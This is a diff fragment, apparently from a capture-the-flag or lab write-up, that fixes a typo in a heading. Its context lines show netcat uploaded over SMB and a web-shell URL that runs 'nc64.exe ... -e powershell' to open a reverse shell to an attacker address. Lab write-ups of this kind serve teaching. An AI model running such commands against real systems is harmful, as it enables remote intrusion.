@@ -176,7 +176,7 @@ Lets upload **Netcat for Windows** and start a reverse shell connection:
 smb: \> put nc64.exe
 ```
 
-Start revere shell with **Netcat**:
+Starting reverse shell with **Netcat**:
 ```markdown
 http://10.10.10.97:8808/shell.php?cmd=nc64.exe 10.10.14.20 9001 -e powershell
 ```
